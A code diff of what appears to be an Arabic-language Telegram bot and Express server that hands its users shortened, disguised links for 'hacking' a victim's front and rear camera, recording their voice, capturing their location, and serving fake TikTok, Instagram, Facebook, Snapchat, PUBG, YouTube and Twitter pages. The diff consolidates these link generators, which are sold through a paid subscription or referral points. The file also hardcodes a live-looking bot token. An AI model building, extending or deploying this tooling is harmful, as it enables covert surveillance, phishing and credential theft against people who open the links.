@@ -5,7 +5,7 @@ const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
 const useragent = require('useragent');
-
+const TinyURL = require('tinyurl');
 
 const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
 const bot = new TelegramBot(botToken, { polling: true });
@@ -19,33 +19,20 @@ app.use(express.static(path.join(__dirname, 'uploads')));
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
-const platformVisits = {};
 const userVisits = {};
-const MAX_FREE_ATTEMPTS = 5; // تحديد عدد المحاولات المجانية// مجموعة المستخدمين المشتركين
-const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت"; // رسالة نهاية الفترة التجريبية
-const adminId = '7130416076';
-const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
-
-
-
-function trackAttempt(userId, feature) {
-    if (!userVisits[userId]) userVisits[userId] = {};
-    userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
-    return userVisits[userId][feature];
-}
-
-// استخدم هذه الدالة قبل تنفيذ أي عملية
-if (trackAttempt(userId, 'featureName') > MAX_FREE_ATTEMPTS && !subscribedUsers.has(userId)) {
-    // أرسل رسالة تحذير
-} else {
-    // نفذ العملية
-}
-
- 
+const MAX_FREE_ATTEMPTS = 5;
+const platformVisits = {};
 const allUsers = new Map();
 const activatedUsers = new Set();
 const bannedUsers = new Map();
 const subscribedUsers = new Set();
+const userPoints = new Map();
+const userReferrals = new Map();
+const usedReferralLinks = new Map();
+let pointsRequiredForSubscription = 15;
+
+const adminId = '7130416076';
+const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
 
 function isAdmin(userId) {
   return userId.toString() === adminId;
@@ -125,9 +112,8 @@ function activateUser(userId) {
   }
 }
 
-// دالة لحفظ البيانات (يجب تنفيذها)
 function saveData() {
-  // قم بتنفيذ هذه الدالة لحفظ البيانات في قاعدة البيانات أو ملف
+  // Implement this function to save data to a database or file
   console.log('تم حفظ البيانات');
 }
 
@@ -375,15 +361,6 @@ bot.on('polling_error', (error) => {
 
 console.log('البوت يعمل الآن...');
 
-
-
-  // تنفيذ العمليات عند تلقي الأمر /start
-  
-
-
-// مسار الكاميرا
-
-
 const trackAttempts = (userId, action) => {
     if (!userVisits[userId]) {
         userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
@@ -393,9 +370,6 @@ const trackAttempts = (userId, action) => {
 
     return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
 };
-
-
-// استخدم هذه الدالة قبل تنفيذ أي عملية
 
 // دالة لتتبع المحاولات لمسار المنصة الأصلي
 const trackPlatformAttempts = (platformId) => {
@@ -612,109 +586,110 @@ app.post('/submitIncrease', (req, res) => {
 });
 
 
-
-
-// أوامر البوت
-
-const userPoints = new Map();
-const userReferrals = new Map();
-const usedReferralLinks = new Map();
-let pointsRequiredForSubscription = 15;
-
 function createReferralLink(userId) {
-    const referralCode = Buffer.from(userId.toString()).toString('base64');
-    return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
+  const referralCode = Buffer.from(userId.toString()).toString('base64');
+  return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
 }
 
 function addPoints(userId, points) {
-    const currentPoints = userPoints.get(userId) || 0;
-    const newPoints = currentPoints + points;
-    userPoints.set(userId, newPoints);
-    checkPointsAndSubscribe(userId);
-    return newPoints;
+  const currentPoints = userPoints.get(userId) || 0;
+  const newPoints = currentPoints + points;
+  userPoints.set(userId, newPoints);
+  checkPointsAndSubscribe(userId);
+  return newPoints;
 }
 
 function deductPoints(userId, points) {
-    const currentPoints = userPoints.get(userId) || 0;
-    if (currentPoints >= points) {
-        userPoints.set(userId, currentPoints - points);
-        return true;
-    }
-    return false;
+  const currentPoints = userPoints.get(userId) || 0;
+  if (currentPoints >= points) {
+    userPoints.set(userId, currentPoints - points);
+    return true;
+  }
+  return false;
 }
 
 function checkPointsAndSubscribe(userId) {
-    const points = userPoints.get(userId) || 0;
-    if (points >= pointsRequiredForSubscription && !subscribedUsers.has(userId)) {
-        subscribedUsers.add(userId);
-        bot.sendMessage(userId, 'مبروك! لقد جمعت نقاط.كافيه تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
-    }
+  const points = userPoints.get(userId) || 0;
+  if (points >= pointsRequiredForSubscription && !subscribedUsers.has(userId)) {
+    subscribedUsers.add(userId);
+    bot.sendMessage(userId, 'مبروك! لقد جمعت نقاط كافية. تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
+  }
+}
+
+function trackAttempt(userId, feature) {
+  if (!userVisits[userId]) userVisits[userId] = {};
+  userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
+  return userVisits[userId][feature];
+}
+
+function shortenUrl(url) {
+  return new Promise((resolve, reject) => {
+    TinyURL.shorten(url, function(res, err) {
+      if (err)
+        reject(err);
+      else
+        resolve(res);
+    });
+  });
 }
 
 bot.onText(/\/start (.+)/, async (msg, match) => {
-    const startPayload = match[1];
-    const newUserId = msg.from.id.toString();
-    
-    try {
-        const referrerId = Buffer.from(startPayload, 'base64').toString();
-        if (referrerId !== newUserId) {
-            const usedLinks = usedReferralLinks.get(newUserId) || new Set();
-            if (!usedLinks.has(referrerId)) {
-                usedLinks.add(referrerId);
-                usedReferralLinks.set(newUserId, usedLinks);
-                const referrerPoints = addPoints(referrerId, 1);
-                await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
-                await bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
-            } else {
-                await bot.sendMessage(newUserId, 'مرحبًا بك مرة أخرى! لقد استخدمت هذا الرابط من قبل.');
-            }
-        }
-    } catch (error) {
-        console.error('خطأ في معالجة رمز الإحالة:', error);
+  const startPayload = match[1];
+  const newUserId = msg.from.id.toString();
+  
+  try {
+    const referrerId = Buffer.from(startPayload, 'base64').toString();
+    if (referrerId !== newUserId) {
+      const usedLinks = usedReferralLinks.get(newUserId) || new Set();
+      if (!usedLinks.has(referrerId)) {
+        usedLinks.add(referrerId);
+        usedReferralLinks.set(newUserId, usedLinks);
+        const referrerPoints = addPoints(referrerId, 1);
+        await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
+        await bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
+      } else {
+        await bot.sendMessage(newUserId, 'مرحبًا بك مرة أخرى! لقد استخدمت هذا الرابط من قبل.');
+      }
     }
-    showButtons(msg.chat.id, newUserId);
+  } catch (error) {
+    console.error('خطأ في معالجة رمز الإحالة:', error);
+  }
+  showButtons(msg.chat.id, newUserId);
 });
 
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text ? msg.text.toLowerCase() : '';
   const senderId = msg.from.id;
-  const firstName = msg.from.first_name;
-  const lastName = msg.from.last_name || '';
-  const username = msg.from.username || '';
 
-  // التحقق من الأوامر
   if (text !== '/start') {
-    // تجاهل الرسائل التي لا تحتوي على الأمر /start
     return;
   }
 
-  // التحقق من عضوية القناة المطلوبة
-  if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
+  if (forcedChannelUsernames.length && !activatedUsers.has(chatId)) {
     for (const channel of forcedChannelUsernames) {
-        try {
-            const member = await bot.getChatMember(channel, chatId);
-            if (member.status === 'left' || member.status === 'kicked') {
-                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
-                    reply_markup: {
-                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
-                    }
-                });
-                return;
+      try {
+        const member = await bot.getChatMember(channel, chatId);
+        if (member.status === 'left' || member.status === 'kicked') {
+          bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
+            reply_markup: {
+              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
             }
-        } catch (error) {
-            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
-            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
-            return;
+          });
+          return;
         }
+      } catch (error) {
+        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+        bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
+        return;
+      }
     }
   }
 
-  // تنفيذ العمليات عند تلقي الأمر /start
   if (text === '/start') {
-    let statusMessage = `قوم بجمع نقاط كافيه لاستخدام البوت مجانآ.`;
+    let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا.`;
 
-    let keyboard = [
+   let keyboard = [
       [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
       [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
       [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
@@ -731,152 +706,75 @@ bot.on('message', async (msg) => {
       [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
     ];
 
-    bot.sendMessage(chatId, `${statusMessage}\n\nمرحبا قوم بختيار اي شي تريده لكن لان تستطيع استخدام اي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 او قوم بتجميع نقاط لاستخدامه مجانآ:`, {
-        reply_markup: {
-            inline_keyboard: keyboard
-        }
+    bot.sendMessage(chatId, `${statusMessage}\n\nمرحبا قم باختيار أي شيء تريده لكن لن تستطيع استخدام أي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 أو قم بتجميع نقاط لاستخدامه مجانًا:`, {
+      reply_markup: {
+        inline_keyboard: keyboard
+      }
     });
 
     return;
   }
 });
 
-
-   
-
 bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const userId = callbackQuery.from.id.toString();
-    const data = callbackQuery.data;
+  const chatId = callbackQuery.message.chat.id;
+  const userId = callbackQuery.from.id.toString();
+  const data = callbackQuery.data;
 
-    switch(data) {
-        case 'create_referral':
-            const referralLink = createReferralLink(userId);
-            userReferrals.set(userId, referralLink);
-            await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
+  switch(data) {
+    case 'create_referral':
+      const referralLink = createReferralLink(userId);
+      userReferrals.set(userId, referralLink);
+      await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
+      break;
+    case 'my_points':
+      const points = userPoints.get(userId) || 0;
+      const isSubscribed = subscribedUsers.has(userId);
+      let message = isSubscribed
+        ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
+        : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+      await bot.sendMessage(chatId, message);
+      break;
+    case 'front_camera':
+    case 'rear_camera':
+    case 'voice_record':
+    case 'get_location':
+    case 'increase_tiktok':
+    case 'increase_instagram':
+    case 'increase_facebook':
+    case 'increase_snapchat':
+    case 'pubg_uc':
+    case 'increase_youtube':
+    case 'increase_twitter':
+      if (trackAttempt(userId, data) > MAX_FREE_ATTEMPTS && !subscribedUsers.has(userId)) {
+        await bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لن تستطيع استخدام هذه الميزة سوى 5 مرات. قم بالاشتراك من المطور أو قم بجمع نقاط لاستخدام بدون قيود.');
+      } else {
+        const baseUrl = 'https://yyytot.onrender.com';
+        let url;
+        switch (data) {
+          case 'front_camera':
+          case 'rear_camera':
+            url = `${baseUrl}/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
             break;
-        case 'my_points':
-            const points = userPoints.get(userId) || 0;
-            const isSubscribed = subscribedUsers.has(userId);
-            let message = isSubscribed
-                ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
-                : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
-            await bot.sendMessage(chatId, message);
+          case 'voice_record':
+            url = `${baseUrl}/record/${chatId}`;
             break;
-        case 'front_camera':
-        case 'rear_camera':
-        case 'voice_record':
-        case 'get_location':
-            if (!subscribedUsers.has(userId) && (userVisits[userId]?.[data] || 0) >= MAX_FREE_ATTEMPTS) {
-                await bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هذه الميزة سوى 5 مرات. قم بالاشتراك من المطور أو قم بجمع نقاط لاستخدام بدون قيود.');
-            } else {
-                // هنا يمكنك إضافة الكود الخاص بكل عملية
-                if (!userVisits[userId]) userVisits[userId] = {};
-                userVisits[userId][data] = (userVisits[userId][data] || 0) + 1;
-                // قم بتنفيذ العملية المطلوبة هنا
-                await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
-            }
+          case 'get_location':
+            url = `${baseUrl}/getLocation/${chatId}`;
             break;
-        default:
-            await bot.sendMessage(chatId, 'عذرًا، حدث خطأ غير متوقع.');
-    }
-});
-
-
-
-const TinyURL = require('tinyurl');
-
-function shortenUrl(url) {
-  return new Promise((resolve, reject) => {
-    TinyURL.shorten(url, function(res, err) {
-      if (err)
-        reject(err);
-      else
-        resolve(res);
-    });
-  });
-}
-
-bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        const shortUrl = await shortenUrl(url);
-        bot.sendMessage(chatId, `تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${shortUrl}`);
-    } else if (data === 'voice_record') {
-        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
-    } else if (data === 'get_location') {
-        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
-        console.log('Data received:', data);
-        console.log('Chat ID:', chatId);
-        console.log('URL:', url);
-        
-        const shortUrl = await shortenUrl(url);
-        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${shortUrl}`)
-            .then(() => console.log('Message sent successfully'))
-            .catch(err => console.error('Error sending message:', err));
-    }
-});
-
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    const duration = parseInt(msg.text, 10);
-
-    if (!isNaN(duration)) {
-        if (duration > 0 && duration <= 20) {
-            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
-            const shortLink = await shortenUrl(link);
-            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${shortLink}`);
-        } else {
-            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
+          default:
+            url = `${baseUrl}/${data.replace('increase_', '')}/${chatId}`;
         }
-    }
+        const shortUrl = await shortenUrl(url);
+        await bot.sendMessage(chatId, `تم إنشاء الرابط: ${shortUrl}`);
+      }
+      break;
+    default:
+      await bot.sendMessage(chatId, 'عذرًا، حدث خطأ غير متوقع.');
+  }
 });
-
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
-    const shortBaseUrl = await shortenUrl(baseUrl);
-    
-    // Use shortBaseUrl here if needed
-
-    let url;
-    switch (query.data) {
-        case 'increase_tiktok':
-            url = `${baseUrl}/tiktok/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التيك توك: ${url}`);
-            break;
-        case 'increase_instagram':
-            url = `${baseUrl}/instagram/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الانستغرام: ${url}`);
-            break;
-        case 'increase_facebook':
-            url = `${baseUrl}/facebook/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الفيسبوك: ${url}`);
-            break;
-        case 'increase_snapchat':
-            url = `${baseUrl}/snapchat/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق السناب شات: ${url}`);
-            break;
-        case 'pubg_uc':
-            url = `${baseUrl}/pubg_uc/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق بوبجي: ${url}`);
-            break;
-        case 'increase_youtube':
-            url = `${baseUrl}/youtube/${chatId}`;
-            bot.sendMessage(chatId, ` تم تلغيم رابط اختراق اليوتيوب: ${url}`);
-            break;
-        case 'increase_twitter':
-            url = `${baseUrl}/twitter/${chatId}`;
-            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
-            break;
-    }
-});
-
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+  console.log(`Server is running on port ${PORT}`);
 });
